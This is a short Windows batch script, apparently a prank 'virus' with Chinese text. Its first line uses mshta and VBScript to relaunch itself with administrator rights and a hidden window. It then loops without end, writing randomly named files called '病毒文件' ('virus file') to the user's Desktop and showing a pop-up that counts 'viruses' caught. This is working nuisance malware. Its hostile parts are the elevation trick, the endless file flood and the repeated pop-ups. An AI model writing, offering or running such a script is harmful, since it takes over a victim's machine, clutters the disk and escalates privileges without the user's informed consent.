@%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",0)(window.close)&&exit

:a

set /a a+=1

echo %random%-%random%-%random% > C:\Users\%username%\Desktop\病毒文件.%random%

mshta javascript:alert("您已中第%a%个病毒.");close();

goto a